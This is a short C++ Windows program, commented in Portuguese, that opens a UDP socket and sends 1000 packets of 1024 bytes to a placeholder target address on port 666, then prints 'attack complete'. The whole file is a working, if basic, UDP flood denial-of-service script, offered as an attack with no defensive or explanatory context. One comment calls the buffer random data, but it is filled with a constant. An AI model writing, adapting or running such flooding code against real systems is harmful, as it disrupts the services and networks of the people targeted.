#include <iostream>
#include <cstring>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment (lib, "Ws2_32.lib")

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in target;
    char buffer[1024];

    // Inicializar o Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed" << std::endl;
        return 1;
    }

    // Criar o socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == INVALID_SOCKET) {
        std::cerr << "socket() failed" << std::endl;
        WSACleanup();
        return 1;
    }

    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr("TARGET_IP_ADDR");
    target.sin_port = htons(666);

    // Preencher o buffer com dados aleatórios
    memset(buffer, 'A', sizeof(buffer));

    // Enviar pacotes para o target
    int packetSize = 1024;
    int sendResult;
    for (int i = 0; i < 1000; i++) {
        sendResult = sendto(sock, buffer, packetSize, 0, (struct sockaddr*)&target, sizeof(target));
        if (sendResult == SOCKET_ERROR) {
            std::cerr << "sendto() failed" << std::endl;
            closesocket(sock);
            WSACleanup();
            return 1;
        }
    }

    // Limpar
    closesocket(sock);
    WSACleanup();

    std::cout << "attack complete" << std::endl;
    return 0;
}
